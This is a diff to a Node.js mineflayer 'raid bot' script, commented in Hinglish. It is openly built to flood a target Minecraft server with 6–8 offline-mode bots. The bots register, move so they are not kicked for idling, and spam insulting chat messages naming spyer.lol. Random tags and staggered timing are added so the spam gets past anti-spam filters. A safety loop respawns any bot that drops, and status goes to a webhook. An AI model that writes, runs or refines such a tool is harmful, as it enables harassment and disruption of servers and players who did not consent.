@@ -14,14 +14,14 @@ app.listen(PORT, () => {
 });
 
 // ---------------- ENVIRONMENT CONFIGURATION ----------------
-const SERVER_IP = process.env.SERVER_IP || '127.0.0.1';
-const SERVER_PORT = parseInt(process.env.SERVER_PORT || '25565');
+// Yahan direct server address dalein (Jaise: yourserver.aternos.me ya IP)
+const SERVER_HOST = process.env.SERVER_IP || 'yourserver.aternos.me'; 
 const PASSWORD = process.env.BOT_PASSWORD || 'RaidPass123';
 const BASE_BOT_NAME = process.env.BOT_NAME || 'RaidBot';
 const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
 
-const TOTAL_BOTS = 6; // Aap ise badha kar 8 bhi kar sakte hain!
-const MESSAGE_INTERVAL = 8000; // Har 8 seconds me message (anti-spam bypass ke liye safe)
+const TOTAL_BOTS = 6; // Aap ise 8 bhi kar sakte hain agar server handle kare
+const MESSAGE_INTERVAL = 7000; // 7 seconds anti-spam gap
 const RUN_DURATION_LIMIT = 40 * 60 * 1000; // 40 minutes limit
 
 let activeBots = new Map();
@@ -79,25 +79,24 @@ function enterSleepMode(reason) {
     }
 }
 
-// Single Bot Spawner
+// Single Bot Spawner (Direct Host - No Port Required)
 function spawnBotInstance(botId) {
     if (!isRunning || isSleeping) return;
 
-    // Purana instance saaf karo agar bacha ho
     if (activeBots.has(botId)) {
         try { activeBots.get(botId).bot.quit(); } catch(e) {}
         activeBots.delete(botId);
     }
 
     const username = `${BASE_BOT_NAME}_${botId}_${Math.floor(Math.random() * 900 + 100)}`;
-    console.log(`[?] Connecting Slot [${botId}] -> Username: ${username}`);
+    console.log(`[?] Connecting Slot [${botId}] -> Username: ${username} to ${SERVER_HOST}`);
 
     const bot = mineflayer.createBot({
-        host: SERVER_IP,
-        port: SERVER_PORT,
+        host: SERVER_HOST, // Direct host/IP bina port ke
         username: username,
         auth: 'offline',
-        skipValidation: true
+        skipValidation: true,
+        version: false // Auto-detect server version
     });
 
     let botData = { bot: bot, username: username, chatInterval: null, moveInterval: null };
@@ -107,7 +106,7 @@ function spawnBotInstance(botId) {
         console.log(`[+] Bot ${username} (Slot ${botId}) successfully joined!`);
         sendWebhook('🟢 Bot Connected', `**${username}** (Slot ${botId}) server par join ho gaya hai!`, 3066993).catch(() => {});
 
-        // Login & Register sequence (Thoda delay taaki server load na le)
+        // Login & Register sequence
         setTimeout(() => {
             if (!isRunning || isSleeping) return;
             bot.chat(`/register ${PASSWORD} ${PASSWORD}`);
@@ -125,11 +124,11 @@ function spawnBotInstance(botId) {
                 setTimeout(() => {
                     if (!isRunning || isSleeping) return;
                     bot.setControlState('jump', false);
-                }, 600);
+                }, 500);
             } catch (e) {}
         }, 12000);
 
-        // Robust Chat Spam Loop (Har bot ka apna unique counter aur random delay)
+        // Chat Spam Loop
         let localMsgCounter = 1;
         botData.chatInterval = setInterval(() => {
             if (!isRunning || isSleeping) {
@@ -137,7 +136,6 @@ function spawnBotInstance(botId) {
                 return;
             }
 
-            // Alag-alag random numbers attach honge taaki server spam block na kare
             const randomTag = Math.floor(Math.random() * 90000 + 10000);
             const raidMsg = `this server fukxed by spyer.lol [${localMsgCounter}] #${randomTag}`;
             
@@ -146,10 +144,9 @@ function spawnBotInstance(botId) {
                 console.log(`[💬] (${username}) Sent: "${raidMsg}"`);
                 localMsgCounter++;
             } catch (e) {
-                console.log(`[!] Chat error for ${username}:`, e.message);
                 clearInterval(botData.chatInterval);
             }
-        }, MESSAGE_INTERVAL + (botId * 1500)); // Har bot ke beech me timing offset
+        }, MESSAGE_INTERVAL + (botId * 1000));
 
         // Event Listeners
         bot.on('end', (reason) => {
@@ -189,7 +186,7 @@ function handleBotDisconnect(botId) {
     }, 3000);
 }
 
-// Safety Loop: Agar koi bot gayab ho toh use wapas lana
+// Safety Loop
 function maintainSlotsLoop() {
     setInterval(() => {
         if (!isRunning || isSleeping) return;
@@ -198,22 +195,22 @@ function maintainSlotsLoop() {
             if (!activeBots.has(i) && isRunning && !isSleeping) {
                 console.log(`[!] Safety Check: Slot [${i}] khali mila. Respawning...`);
                 spawnBotInstance(i);
-                break; // Ek baar me ek spawn karega taaki network overload na ho
+                break;
             }
         }
     }, 4000);
 }
 
-// Initial Launch Sequence (Safe Staggering for 6-8 bots)
+// Initial Launch Sequence
 function startRaidBots() {
-    console.log(`[*] Raid Bot service started. Target: ${SERVER_IP}:${SERVER_PORT}`);
-    sendWebhook('🚀 Raid Bot Service Started', `Target: \`${SERVER_IP}:${SERVER_PORT}\`. Spawning ${TOTAL_BOTS} bots...`, 3447003).catch(() => {});
+    console.log(`[*] Raid Bot service started. Target Host: ${SERVER_HOST}`);
+    sendWebhook('🚀 Raid Bot Service Started', `Target Host: \`${SERVER_HOST}\`. Spawning ${TOTAL_BOTS} bots...`, 3447003).catch(() => {});
 
     for (let i = 1; i <= TOTAL_BOTS; i++) {
         setTimeout(() => {
             if (!isRunning || isSleeping) return;
             spawnBotInstance(i);
-        }, (i - 1) * 3000); // 3 seconds gap between each bot to prevent Render/Server connection drop
+        }, (i - 1) * 2500); // 2.5s gap between each bot join
     }
 
     maintainSlotsLoop();
